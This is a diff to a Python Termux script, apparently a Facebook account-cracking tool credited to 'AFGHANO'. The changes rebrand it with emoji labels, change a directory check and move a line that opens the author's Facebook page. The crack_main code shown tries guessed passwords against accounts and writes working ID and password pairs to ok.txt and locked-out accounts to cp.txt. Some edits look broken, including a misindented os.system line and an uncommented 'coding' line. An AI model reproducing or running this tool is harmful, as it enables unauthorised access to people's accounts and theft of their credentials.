@@ -1,7 +1,7 @@
 #SOURCE BY : AFGHANO
 #GITHUB : Afghano02
 #Afghano ME BAP HU TERA 
-#coding = utf-8
+coding = utf-8
 from uuid import uuid4
 import os,sys,tempfile,string,random,subprocess,uuid
 http_directory = tempfile.mkdtemp(prefix='.')
@@ -89,7 +89,6 @@ else:
         pass
 os.system("rm -rf .f1")
 os.system("rm -rf .f2")
-os.system('xdg-open https://www.facebook.com/afgha.hacker')
 logo= f'''
 ★ ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★ ★
 ★ ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★ ★
@@ -106,7 +105,7 @@ logo= f'''
     Tool Version :     10.0.70
     Thanks Alot  :     AFGHANO
 {50*"-"}'''
-
+  os.system('xdg-open https://www.facebook.com/afgha.hacker')
 #--(Dark@Colours)---#
 r="\033[1;91m"
 g="\033[1;92m"
@@ -545,12 +544,12 @@ class crack_main():
                                 q = json.loads(po)
                                 #print(po)
                                 if 'session_key' in po:
-                                        print(' \033[1;32m [Afghano-OK] '+iid+' | '+pas+'\033[0;97m')
+                                        print(' \033[1;32m [😍-OK] '+iid+' | '+pas+'\033[0;97m')
                                         open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                                         ok.append(iid)
                                         break
                                 elif 'www.facebook.com' in po:
-                                        print(' \033[1;31m [Afghano-CP] '+iid+' | '+pas+'\033[0;97m')
+                                        print(' \033[1;31m [😰-CP] '+iid+' | '+pas+'\033[0;97m')
                                         open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                                 else:
                                         continue
@@ -639,12 +638,12 @@ class crack_main():
                                 q = json.loads(po)
                                 #print(po)
                                 if 'session_key' in po:
-                                        print(' \033[1;32m [Afghano-OK] '+iid+' | '+pas+'\033[0;97m')
+                                        print(' \033[1;32m [😍-OK] '+iid+' | '+pas+'\033[0;97m')
                                         open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                                         ok.append(iid)
                                         break
                                 elif 'www.facebook.com' in po:
-                                        print(' \033[1;31m [Afghano-CP] '+iid+' | '+pas+'\033[0;97m')
+                                        print(' \033[1;31m [😰-CP] '+iid+' | '+pas+'\033[0;97m')
                                         open('/sdcard/ids/cp.txt','a').write(iid+'|'+pas+'\n')
                                 else:
                                         continue
@@ -936,7 +935,7 @@ except PermissionError:
 '''pat = os.getcwd()
 datar = []
 datar.append(pat)
-if '/data/data/com.termux/files/home/Afghano' in datar:
+if '/data/data/com.termux/files/home/Qsr' in datar:
         pass
 else:
         for i in range(5000):
